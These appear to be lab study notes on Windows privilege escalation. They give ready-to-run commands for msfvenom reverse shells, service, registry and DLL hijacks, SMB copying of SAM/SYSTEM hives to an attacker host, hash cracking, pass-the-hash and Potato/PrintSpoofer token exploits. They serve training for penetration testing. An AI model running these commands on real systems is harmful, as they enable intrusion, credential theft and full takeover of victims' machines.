------------------------------------------------------------------------------------------------------------------------------------------------------
File Transfer from Remote Machine to Attacker Machine via SMB

    On Attacker Machine run:
    python3 /usr/share/doc/python3-impacket/examples/smbserver.py DIRECTORYTOMOUNT .
    On Remote Machine run: 
    copy fileonremotemachine.txt \\ATTACKERIP\DIRECTORYMOUNTED\

    File Transfer from Attacker Machine to Remote Machine via SMB:
    On Remote Machine run:
    copy \\ATTACKERIP\DIRECTORYMOUNTED\fileonattackermachine.txt . 
------------------------------------------------------------------------------------------------------------------------------------------------------
Kernal Exploits

    1. Enumerate Windows versions / patch level (systeminfo)
    2. Find matching exploits (Google, ExploitDB, Github)
    3. Compile and run
    Kernel exploits can be unstable and can cause the system to crash, so use as last resort.
    TIP!!!
      You can use wesng tool to first check for kenel exploits
      1. Run the systeminfo command and send the info to your attacker machine, then run wesng on that textfile
      2. Precompiled Kernel Exploits can be found https://github.com/SecWiki/windows-kernel-exploits
        a. It's easier to match with this than to compile your own.
        
    EXAMPLE!!!
    
      CVE-2018-8120 kernel exploit can run any program. You can run reverse.exe created by msfvenom for a reverse shell
      1. Get a normal user reverse shell
      2. Open up another listener
      3. Run CVE-2018-8120 kernel exploit from the first reverse shell
        .\cve-2018-8120-x64.exe C:\PrivEsc\reverse4444.exe
      
------------------------------------------------------------------------------------------------------------------------------------------------------
Service Exploits

    Query the config of a service
      > sc.exe qc <name>
    Query the current status of a service
      > sc.exe query <name>
    Modify a config option of a service
      > sc.exe config <name> <option>= <value>
    Start/Stop a service:
      > net start/stop <name>

  5 Types of Service Misconfigurations

     1. Insecure Service Properties
        a. Each service has an ACL which defines certain service-specific permissions
        b. Some permissions are harmless (ex.SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS)
        c. Some are useful (ex. SERVICE_STOP, SERVICE_START)
        d. Some are dangerous (ex. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
        If our user has permission to change the config of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
        accesschk.exe can check if a user can start and stop a service 
        
        EXAMPLE!!! ("user" checking the "daclsvc" service)
        
        1. Run winPEASany.exe on the system and found daclsvc was writable
        2. Check permissions of daclsvc
            .\accesschk.exe /accepteula -uwcqv user daclsvc 
            SERVICE_START
            SERVICE_STOP
        3. Next query the service 
            sc qc daclsvc
            "DEMAND_START" means to manually start the service
        4. Check status of service 
            sc query daclsvc
        5. Change the config to a payload of our own, probably a reverse shell
            sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
            TIP!!!
            If you can change a service config, but cannot stop/start it, you may not be able to escalate privileges
        
     2. Unquoted Service Path
        Windows will check if there are quotes on the service and run the filepath as arguments. We can take advantage of this.
        
        EXAMPLE!!!
        
        1. Run winPEASany.exe on the system and found C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        2. Check permissions of the file unquotedsvc 
            run .\accesschk.exe /accepteula -ucqv unquotedsvc
            SERVICE_START
            SERVICE_STOP
        3. Run accesschk on each directory to find writable permissions
            .\accesschk.exe /accepteula -uwdq C:\
            RW BUILTIN\Administrators
            RW NT AUTHORITY\SYSTEM
            .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
            RW BUILTIN\Administrators
            RW NT AUTHORITY\SYSTEM
            .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
            RW BUILTIN\Administrators
            RW NT AUTHORITY\SYSTEM
            RW BUILTIN\Users  (We are apart of this group as a normal user!!!)
         4. The next folder for this service is "\Common Files\", so we will make a reverse shell named "Common.exe" since Windows will check for "Common" as the next arg
            copy reverse.exe "C:\PRogram Files\Unoquoted Path Service\Common.exe"
         5. Start the service
            net start unquotedsvc
         
     3. Weak Registry Permissions
        Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, we can possibly modify a service's config.
        
        EXAMPLE!!!
        
        1. WinPEASany.exe found we can modify a service registry
            HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
        2. Verify permissions via powershell or acchesschk (we are part of the Interactive group)
            powershell -exec bypass
            Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
            .\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
            RW NT AUTHORITY\INTERACTIVE
                KEY_ALL_ACCESS
        3. Use accesschk.exe to verify we can start the service
            .\accesschk.exe /accepteula -ucqv user regsvc
            SERVICE_START
            SERVICE_STOP
        4. Check current values in service registry entry
            reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
            ImagePath REG_EXPAND_SZ "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        5. Override ImagePath Value to point to reverse shell via change binpath
            reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
        6. Start the service
            net start regsvc
        
     4. Insecure Service Executables
        If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable
        Always create a backup of the original executable in a real system
        
        EXAMPLE!!!
        
        1. Winpeas found  filepermsvc is writeable by everyone "C:\Program Files\File Permissions Service\filepermservice.exe"
        2. Check with accesschk to verify we can write over it
            .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
            RW Everyone
                FILE_ALL_ACCESS
        3. Check if we can start the service
            .\accesschk.exe /accepteula -uvqc filepermsvc
            SERVICE_START
            SERVICE_STOP
        4. Backup original executable
            copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
        5. Overwrite executable with reverse shell
            copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
        6. Start the service
            net start filepermsvc
        
     5. DLL Hijacking
        Services will try to load funtionality from a library called a DLL. Whatever the funtionality the DLL provides will be executed with the same privileges as the service that loaded it.
        If a DLL is loaded with an absolute path, we may be able to escalate privileges if the DLL is writable
        If a DLL is missing from the system and we have write privileges to the directory within the PATH, we may be able to escalate privileges
        Usually a very manual process
        
        EXAMPLE!!!
        
        1. Winpeas detected (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] and non-Microsoft service dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"]
        (to save time, we are only checking the dllsvc)
        2. Check both for start/stop access
            .\accesschk.exe /accepteula -uvqc dllsvc
        3. Check for the .exe the service needs to run
            sc qc dllsvc
        4. Copy the .exe off the host and analyze it with a user with admin rights
            Analyze with ProcMon64.exe
                1. stop and clear the current capture
                2. add the dllhijackservice.exe
                3. remove registry and network activity filters
        5. Start the service
            net start dllsvc
        6. Check Procmon activity
            It is trying to find the file in the C:\Temp directory, which is writable by us.
        7. Generate reverse shell with DLL format
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f dll -o hijackme.dll
            copy it to the C:\Temp folder since Procmon found that it checks there.
        6. Stop the service
            net stop dllsvc
        7. Start the service
            net start dllsvc
-------------------------------------------------------------------------------------------------------------------------------------------------------     
Registry Exploits
 
     AutoRuns
     Windows can be configured to run commands at startup. AutoRuns are configured in the Registry. If we can write to an AutoRun executable and have privileges to restart the machine, we may be able to escalate privileges
     
     EXAMPLE!!!
    
     1. Winpeas found "C:\Program Files\Autorun Program\program.exe", FilePerms: Everyone [AllAccess]
     2. Use accesschk to verify permissions on the .exe
        .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
        RW Everyone
                FILE_ALL_ACCESS
     3. Make backup of original .exe
        copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
     4. Copy reverse shell into the old .exe file
        copy /Y reverse4444.exe "C:\Program Files\Autorun Program\program.exe"
     5. Setup listener
     6. Restart Windows
        shutdown -r (may take a while to shutdown)
      
     AlwaysInstallElevated 
     MSI files are package files used to install apps. These files run with permission of user trying to install them. These can be run with elevated privileges like admin. We can possibly generate malicious MSI files that have a reverse shell.
      The catch is that two Registry settings must be enabled for this to work. "AlwaysInstallElevated" value must be set to 1 for both local machine and the current user. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer. If either are missing/disabled the exploit won't work.
      
      EXAMPLE!!!
      
      1. Winpeas found Checking AlwaysInstallElevated(T1012), AlwaysInstallElevated set to 1 in HKLM!, AlwaysInstallElevated set to 1 in HKCU!
      2. Verify by querying the keys
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      3. Create new MSI reverse shell.
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.201.129 LPORT=4444 -f msi -o reverse.msi
      4. Startup listener
      5. Copy file to machine and run it
         msiexec /quiet /qn /i reverse.msi
      
------------------------------------------------------------------------------------------------------------------------------------------------------
Passwords

    Admins leave their passwords in readable locations. Windows and several features store passwords insecurely.
    Some are in the Registry in plaintext/configurations.
    The following commands will search the registry for keys and values that contain "password".
    
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s

    There is usually a lot of generated results, so it is better to look in known locations.
    
    EXAMPLE!!!
    
    1. Winpeas found Looking for AutoLogon credenials and Putty Sessions
    2. Verify by querying registry
        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
        reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
    3. Login with winexe on Kali to spawn a shell
        winexe -U 'admin%password123' //192.168.201.130 cmd.exe
    4. Since the user is an admin, we can modify the command to add --system to become nt authority\system
        winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe

    Winpeas will help search popular locations, but still need to search manually.
    
Saved Creds

    Windows has runas command which allow user to run commands with privileges of other users.
    Usually requires knowledge of other user's password.
    However, Windows allows users to save their creds to to the system, and the saved credentials can bypass the requirement.
    
    EXAMPLE!!!
    
    1. Winpeas found an admin in the credential manager
    User: MSEDGEWIN10\admin
    2. Verify with cmd
        cmdkey /list
    3. Use runas command with /savecred flag to run anything we want as the admin user
        runas /savecred /user:admin C:\PrivEsc\reverse4444.exe

Configuration Files

    Some admins leave config files on the system with passwords in them.
    Unattend.xml file is one example.
    It allows for the automated setup of Windows systems.
    
    Recursively search for files in the current directory with "pass" in the name, or ending in ".config":4
        dir /s *pass* == *.config
    Recursively search for files in the current directory that contain the word "password" and also end in either .xml .ini or .txt
        findstr /si password *.xml *.ini *.txt

    EXAMPLE!!!
    
    1. Winpeas found looking for possible known files that can contain creds, C:\Windows\Panther\Unattend.xml
    2. Check the file
        type C:\Windows\Panther\Unattend.xml
    3. Password was found in base64
        <Password>
            <Value>cGFzc3dvcmQxMjM=</Value>
            <Username>Admin</Username>
    4. Decode it
        echo "cGFzc3dvcmQxMjM=" | base64 -d
        password123
    5. On Kali login with winexe
        winexe -U 'admin%password123' //192.168.201.130 cmd.exe
    6. Since the user is an admin, we can modify the command to add --system to become nt authority\system
        winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe

SAM

    Windows store password hashes in the SAM (Security Account Manager).
    Hashes are encrypted with a key which can be found in a file named SYSTEM.
    If you can read the SAM and SYSTEM files, you can extract the hashes.
    
    SAM and SYSTEM files are usually located in the C:\Windows\System32\config directory
    The files are locked while Windows is running
    Backups may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories
    
    EXAMPLE!!!
    
    1. Winpeas found Looking for possible known files that can contain creds, C:\Windows\Repair\SAM and C:\Windows\Repair\SYSTEM
    2. Copy files back to kali
        copy C:\Windows\Repair\SAM \\192.168.201.129\tools\
        copy C:\Windows\Repair\SYSTEM \\192.168.201.129\tools\
    3. Use PWDump tool part of Creddump7
        cd /usr/share/creddump7
        python3 pwdump.py /home/kali/Downloads/tools/SYSTEM /home/kali/Downloads/tools/SAM
        
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:20ff0389f84bdbf9ce6fc36af6993b63:::
        IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        sshd:1002:aad3b435b51404eeaad3b435b51404ee:42760776cade85fd98103a0f44437800:::
        user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
        admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
    TIP!!!
    If the account has "31d" in the beginning, it is possibly there is no password, or the password is disabled
    4. Use hashcat to crack the admin pass
        hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
        a9fdfa038c4b75ebc76dc855dd74f0da:password123
    5. On Kali login with winexe
        winexe -U 'admin%password123' //192.168.201.130 cmd.exe
    6. Since the user is an admin, we can modify the command to add --system to become nt authority\system
        winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe
    
Passing the Hash
    
    Windows will accept hashes instead of passwords to authenticate with a number of services.
    We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user's hash
    
    EXAMPLE!!!
    1. Winpeas found Looking for possible known files that can contain creds, C:\Windows\Repair\SAM and C:\Windows\Repair\SYSTEM
    2. Copy files back to Kali
        copy C:\Windows\Repair\SAM \\192.168.201.129\tools\
        copy C:\Windows\Repair\SYSTEM \\192.168.201.129\tools\
    3. Use PWDump tool part of Creddump7
        cd /usr/share/creddump7
        python3 pwdump.py /home/kali/Downloads/tools/SYSTEM /home/kali/Downloads/tools/SAM
        
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:20ff0389f84bdbf9ce6fc36af6993b63:::
        IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
        sshd:1002:aad3b435b51404eeaad3b435b51404ee:42760776cade85fd98103a0f44437800:::
        user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
        admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
    TIP!!!
    If the account has "31d" in the beginning, it is possibly there is no password, or the password is disabled
    4. Login with the full hash using a modified version of winexe, pth-winexe
        pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.201.130 cmd.exe
    5. For a system shell, add the --system flag
        pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.201.130 cmd.exe
    
------------------------------------------------------------------------------------------------------------------------------------------------------
Scheduled Tasks

    
    Windows can be configured to run tasks at a specific times (ex. every 5 mins or when an event is triggered (user logon))
    tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM
    No easy method for enumerating custom tasks that belong to other users as a low privileged user account.
    Often we need to rely on other clues such as finding a script or log file that indicates a scheduled task is being run.
    
    List all scheduled tasks your user can see in CMD:
    schtasks /query /fo LIST /v
    List all scheduled tasks your user can see in PowerShell:
    Get-ScheduledTask | where {$_.TaskPath -notlike "/Microsoft*"} | ft TaskName,TaskPath,State
    
    EXAMPLE!!!
    
    1. Found a random script in C:\DevTools called CleanUp.ps1
       Contents said it will run as SYSTEM
    2. Verify if we can write to the file
        accesschk.exe /accepteula -quv user C:\DevTools\CleanUp.ps1
    	    FILE_WRITE_DATA
    3. We can insert our own commands inside the script to execute. Make sure to include the full path to the reverse shell file. Use double arrows.
        echo C:\PrivEsc\reverse4444.exe >> C:\DevTools\CleanUp.ps1 

------------------------------------------------------------------------------------------------------------------------------------------------------
Insecure GUI Apps (Citrix Method)
    On some older versions of Windows, users could be granted permission to run certain GUI apps with admin privileges.
    There are numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.
    Since the parent process is running with admin privileges, so will the spawned shell.
    Uses many of the same techniques to break out of Citrix environments
    
    EXAMPLE!!!
    1. Open MSPaint on user account on RDP Desktop.
    2. Check what privilege the app is running as.
        tasklist /V | findstr mspaint.exe
        It is running as MSEDGEWIN10\admin 
    3. In the MSPaint app, go to open > file
        type in file://c:/windows/system32/cmd.exe
    4. Command prompt will spawn 
    
------------------------------------------------------------------------------------------------------------------------------------------------------
Startup Apps
    
    Each user can define apps that start when they login.
    Windows has a startup directory for apps that should start for all users:
     C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
    If we can create files in this directory, we can use our own reverse shell executable and escalate privileges when an admin logs in.
    
    EXAMPLE!!!
    
    1. Check permissions on the global startup directory
        .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        RW BUILTIN\Users (this is the group of our user)
    2. Add a startup app when a user logins. They must be shortcuts/link files. Can create a vb script to do this. We have one called CreateShortcut.vbs
    3. VB Script:
        Set oWS = WScript.CreateObject("WScript.Shell")
        sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
        Set oLink = oWS.CreateShortcut(sLinkFile)
        oLink.TargetPath = "C:\PrivEsc\reverse4444.exe"
        oLink.Save
    4. Run the script using cscript
        cscript CreateShortcut.vbs
    5. Login as admin to simulate the script running and creating a reverse shell as the user(in this case admin) that logged on.
    
------------------------------------------------------------------------------------------------------------------------------------------------------
Installed Apps

    A lot of the exploits for installed apps rely on all the methods previously learned.
    Go to https://www.exploit-db.com/?type=local&platform=windows and filter for priv esc.
    
    EXAMPLE!!!
    
    1. Enumerate all running programs
        tasklist /V
    2. Can use seatbelt.exe to enumerate for non standard processes, can show the full path of the executable to help determine version number
        .\seatbelt.exe NonstandardProcesses
    3. winPEASany.exe can do it too useing the processinfo flag (sometimes mispelled as procesinfo)
    4. Follow exploitdb instructions
    
------------------------------------------------------------------------------------------------------------------------------------------------------
Hot Potato (CANNOT BE USED ON OSCP)

    It is a spoofing attack and an NTLM relay attack to gain SYSTEM privileges.
    The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM.
    The NTLM credentials then get relayed to SMB to gain command execution.
    Works on Windows 7, 8, and early versions of Windows 10.
    
    EXAMPLE!!!
    
    1. Have a reverseshell as user already
    2. Copy the potato.exe to the machine
    3. Run the potato.exe
        .\potato.exe -ip 192.168.201.129 -cmd "C:\PrivEsc\reverse4444.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

------------------------------------------------------------------------------------------------------------------------------------------------------
Token Impersonation with Rotten/Juicy Potato/Rogue Potato
Going from admin to nt authority\local service > nt authority\system
    
    --This has been patched in Windows 10--
    
    Service accounts can be given special privileges in order for them to run their services and cannot be logged into directly.
    Multiple problems have been found with service accounts making them easier to escalate privileges with.
    
    Original Rotten Potato exploit was identified in 2016.
    Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
    This was possible because the service accounts usually have the "SeImpersonatePrivilege" privilege enabled.
    
    Service accounts are generally configured with these two privileges:
    SeImpersonate and SeAssignPrimaryToken
    They allow the account to impersonate the access tokens of other users, including the SYSTEM user.
    
Juicy Potato    
    
    Rotten Potato was a limited exploit. 
    Juicy Potato works in the same was as Rotten Potato, but the authors did research and found more ways to exploit.
    https://github.com/ohpe/juicy-potato
    
    EXAMPLE!!!
    1. Logged in as admin user and have admin privileges
    2. Run PSexec64.exe to start a reverse shell with the privileges of the local service user attack
        .\PSExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe
    3. Listener should have got the shell with SeImpersonatePrivilege Enabled
        whoami /priv
    4. Open another listener
    5. Run JuicyPotato on the previous reverse shell, 
       The -c flag must have a valid CLSID for the version of windows 
       CLSIDs can be found here https://github.com/ohpe/juicy-potato/tree/master/CLSID
       C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
    6. Another reverse shell should be caught with system privileges
    
Rogue Potato

    Works on Win 10
    https://github.com/antonioCoco/RoguePotato
    Requires logging in as admin user for initial setup and Copy of PSExec64.exe and RoguePotato.exe exploit binary
        
    EXAMPLE!!!
    
    3 Terminals open in Kali
       1. Terminal 1 will have a socat redirector which redirects traffic to port 135 over to port 9999 on the victim machine
            sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.201.130:9999 
       2. Terminal 2 will have a reverse shell caught by netcat listener that should have the 2 privileges SeImpersonate and SeAssignPrimaryToken.     
          We will simulate this via command below on the Windows VM as admin.
            PsExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse4444.exe
          On Terminal 2 check priv with whoami and whoami /priv
              nt authority\local service
              SeImpersonate
              SeAssignPrimaryToken
       3. Terminal 3 will have a netcat listener to catch the system reverse shell ran by the caught reverse shell in terminal 2
            In terminal 2 run:
               RoguePotato.exe -r 192.168.201.129 -l 9999 -e "C:\PrivEsc\reverse4444.exe"
            On terminal 3, check priv with whoami
               nt authority\system

PrintSpoofer (this exploit won't work without C++ vc_redist.x64.exe being already installed on the victim machine)
    
    PrintSpoofer is an exploit that targets the Print Spooler service.
    https://github.com/itm4n/PrintSpoofer
    Happens entirely on the machine itself.
    
    EXAMPLE!!!
    
    2 Terminals open in Kali
        1. Terminal 1 will have a netcat listener to catch a reverse shell with service account privileges. 
           To simulate this we will use an admin account with PSexec64 and run the following command:
           PsExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse4444.exe
        2. check priv with whoami and whoami /priv
            nt authority\local service
            SeImpersonate
            SeAssignPrimaryToken
        3. On terminal 2, open another netcat listener
        4. On terminal 1's reverse shell, run the PrintSpoofer by the following command:
            PrintSpoofer.exe -i -c "C:\PrivEsc\reverse4444.exe"
        5. On terminal 2, check priv with whoami
            nt authority\system
        
------------------------------------------------------------------------------------------------------------------------------------------------------    
Port Forwarding
    
    Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.
    In this case, we need to forward a port on Kali to the internal port on Windows.
    We can do this using a program called plink.exe (Makers of PuTTY)
    Winexe uses port 445, which could not always work with firewalls up.
    
    EXAMPLE!!!
    
    1. With a previous reverse shell, as the user on the victim machine, run plink.exe to redirect port 445
        plink.exe kali@192.168.201.129 -R 445:127.0.0.1:445
    2. On attacker machine, run winexe to 127.0.0.1
        winexe -U 'admin%password123' //127.0.0.1 cmd.exe
    3. Can add --system flag to become nt authority\system
        winexe -U 'admin%password123' --system //127.0.0.1 cmd.exe

------------------------------------------------------------------------------------------------------------------------------------------------------
Privilege Escalation Strategy

    Enumeration
    1. Check your user (whoami) and gropus (net user <username>)
    2. If a low priv user, run winPEAS with fast, searchfast, and cmd options
    3. Run Seatbelt
    4. If scripts don't work, must manually run commands
    
    Strategy
    1. Avoid rabbit holes by creating a checklist of things you need for the priv escalation method to work
    2. Look around for files in user's desktop, C:\ and C:\Program Files
    3. Read through interesting files
    4. Try things that don't have many steps first, like registry exploits, services,
    5. Look at admin processes, enumerate their versions and search for exploits
    6. Check for internal ports that you might be able to forward to your attacking machine
    7. If still no admin shell, re-read enumeration dumps and think of kernel exploits

------------------------------------------------------------------------------------------------------------------------------------------------------
getsystem (Named Pipes and Token Duplication)

    Access Tokens are special objects in Windows which stores a user's identity and privileges.
    Primary Access Token - Created when the user logs in, bound to the current user session. 
    When a user starts a new process, their primary access token is copied and attached to the new process.
    Imporsonation Access Token - Created when a process or thread needs to temporarily run with the security context of another user.


























